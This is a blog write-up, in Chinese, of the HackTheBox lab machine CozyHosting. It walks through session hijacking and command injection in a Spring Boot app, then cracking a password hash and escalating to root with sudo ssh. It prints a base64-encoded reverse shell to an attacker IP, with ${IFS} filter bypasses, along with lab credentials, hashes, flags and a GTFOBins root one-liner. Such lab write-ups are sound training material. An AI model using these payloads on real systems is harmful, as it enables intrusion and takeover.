<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>HTB: CozyHosting | Lavande&#39;s Blog</title>
  <meta name="author" content="Lavande">
  
  <meta name="description" content="IP:10.10.11.230
nmap扫描
12345678910111213141516┌──(kali㉿kali)-[~/htb/CozyHosting]└─$ nmap -p- 10.10.11.230 --min-rate 10000 -oN nmap_portsStarting Nmap 7.92 ( https://nmap.org ) at 2023-11-18 07:00 ESTWarning: 10.10.11.230 giving up on port because retransmission cap hit (10).Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 46.43% done; ETC: 07:01 (0:00:32 remaining)Nmap scan report for cozyhosting.htb (10.10.11.230)Host is up (0.39s latency).Not shown: 64345 closed tcp ports (conn-refused), 1187 filtered tcp ports (no-response)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http9001/tcp open  tor-orportNmap done: 1 IP address (1 host up) scanned in 67.33 seconds

80端口http界面

只有login能点进去

弱口令尝试失败"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="HTB: CozyHosting"/>
  <meta property="og:site_name" content="Lavande&#39;s Blog"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Lavande&#39;s Blog" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 7.1.1"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Lavande&#39;s Blog</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> HTB: CozyHosting</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p><img src="/../images/image-20231118195809339.png" alt="image-20231118195809339"></p>
<p>IP:<code>10.10.11.230</code></p>
<p>nmap扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/CozyHosting]</span><br><span class="line">└─$ nmap -p- 10.10.11.230 --min-rate 10000 -oN nmap_ports</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-18 07:00 EST</span><br><span class="line">Warning: 10.10.11.230 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 46.43% <span class="keyword">done</span>; ETC: 07:01 (0:00:32 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> cozyhosting.htb (10.10.11.230)</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 64345 closed tcp ports (conn-refused), 1187 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">9001/tcp open  tor-orport</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 67.33 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>80端口http界面</p>
<p><img src="/../images/image-20231118200354428.png" alt="image-20231118200354428"></p>
<p>只有login能点进去</p>
<p><img src="/../images/image-20231118200506277.png" alt="image-20231118200506277"></p>
<p>弱口令尝试失败</p>
<p><img src="/../images/image-20231118203151668.png" alt="image-20231118203151668"></p>
<p>查看error界面为Spring Boot框架</p>
<p><img src="/../images/image-20231118203401432.png" alt="image-20231118203401432"></p>
<p>9001端口界面</p>
<p><img src="/../images/image-20231118200316108.png" alt="image-20231118200316108"></p>
<p>脚本扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/CozyHosting]</span><br><span class="line">└─$ nmap -p 22,80,9001 10.10.11.230 -sC -sV -T4 -oN nmap_scripts</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-18 07:02 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> cozyhosting.htb (10.10.11.230)</span><br><span class="line">Host is up (0.44s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  256 43:56:bc:a7:f2:ec:46:<span class="built_in">dd</span>:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)</span><br><span class="line">80/tcp   open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Cozy Hosting - Home</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">9001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)</span><br><span class="line">|_http-title: Directory listing <span class="keyword">for</span> /</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/3.10.12</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 25.71 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Web目录枚举</p>
<p><img src="/../images/image-20231118201739981.png" alt="image-20231118201739981"></p>
<p>枚举出的目录其中一个包含用户的JESSIONID</p>
<p><img src="/../images/image-20231118201922688.png" alt="image-20231118201922688"></p>
<p>用JESSIONID替换原有cookie登录admin</p>
<p><img src="/../images/image-20231118202619779.png" alt="image-20231118202619779"></p>
<p>存在一个提供ssh连接的功能</p>
<p><img src="/../images/image-20231118202718350.png" alt="image-20231118202718350"></p>
<p>填写<code> kali</code>和<code>vpn</code>地址进行尝试</p>
<p><img src="/../images/image-20231118204522133.png" alt="image-20231118204522133"></p>
<p><img src="/../images/image-20231118210019834.png" alt="image-20231118204627282"></p>
<p><img src="/../images/image-20231118205941801.png" alt="image-20231118205941801"></p>
<p>用<code> &#123;IFS&#125;</code> 替换空格</p>
<p><img src="/../images/image-20231118210826486.png" alt="image-20231118210826486"></p>
<p>反弹shell生成</p>
<p><img src="/../images/image-20231118205320610.png" alt="image-20231118205320610"></p>
<p>测试反弹shell</p>
<p><img src="/../images/image-20231118205733379.png" alt="image-20231118205733379"></p>
<p>将空格进行替换</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$&#123;IFS%??&#125;</span><span class="string">&quot;c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi80MjQyIDA+JjE=&quot;</span><span class="variable">$&#123;IFS%??&#125;</span>|<span class="variable">$&#123;IFS%??&#125;</span><span class="built_in">base64</span><span class="variable">$&#123;IFS%??&#125;</span>-d<span class="variable">$&#123;IFS%??&#125;</span>|<span class="variable">$&#123;IFS%??&#125;</span>bash</span><br></pre></td></tr></table></figure>

<p>还是有空格</p>
<p><img src="/../images/image-20231118212820550.png" alt="image-20231118212820550"></p>
<p>URL再次编码</p>
<p><img src="/../images/image-20231118213110807.png" alt="image-20231118213110807"></p>
<p>在kali上开启nc监听</p>
<p><img src="/../images/image-20231118213142291.png" alt="image-20231118213142291"></p>
<p>安装jar查看器<code>jd-gui</code></p>
<p><img src="/../images/image-20231118213809572.png" alt="image-20231118213809572"></p>
<p><img src="/../images/image-20231118214022742.png" alt="image-20231118214022742"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = <span class="literal">true</span></span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql:<span class="comment">//localhost:5432/cozyhosting</span></span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>

<p>postgresql数据库</p>
<p><img src="/../images/image-20231118214236650.png" alt="image-20231118214236650"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=kanderson&amp;password=MRdEQuv6~6P9</span><br></pre></td></tr></table></figure>

<p>登录数据库</p>
<p><img src="/../images/image-20231118214823961.png" alt="image-20231118214823961"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   name    |                           password                           | role  </span><br><span class="line">-----------+--------------------------------------------------------------+-------</span><br><span class="line"> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User</span><br><span class="line"> admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231118215050417.png" alt="image-20231118215050417"></p>
<p><img src="/../images/image-20231118215807044.png" alt="image-20231118215807044"></p>
<p>爆破（不知为何hashcat不能用）</p>
<p><img src="/../images/image-20231118215833354.png" alt="image-20231118215833354"></p>
<p>用john</p>
<p><img src="/../images/image-20231118220310517.png" alt="image-20231118220310517"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manchesterunited</span><br></pre></td></tr></table></figure>

<p>ssh连接</p>
<p><img src="/../images/image-20231118220526516.png" alt="image-20231118220526516"></p>
<p><img src="/../images/image-20231118220553059.png" alt="image-20231118220553059"></p>
<p>user flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">josh@cozyhosting:~$ cat user.txt</span><br><span class="line">9d572e2bec77d894e9a30bd34e0900ed</span><br></pre></td></tr></table></figure>

<p>root提权</p>
<p><img src="/../images/image-20231118221050991.png" alt="image-20231118221050991"></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a></p>
<p><img src="/../images/image-20231118221102624.png" alt="image-20231118221102624"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231118221216032.png" alt="image-20231118221216032"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat root.txt</span><br><span class="line">98291317931360700d3e6cac4143b765</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231118221312689.png" alt="image-20231118221312689"></p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/11/19/HTB-Precious/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/11/16/pictures/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-11-18 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Machines/">Machines<span>7</span></a></li> <li><a href="/categories/Machines/Lab/">Lab<span>7</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/HTB/">HTB<span>9</span></a></li> <li><a href="/tags/easy/">easy<span>6</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 Lavande's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
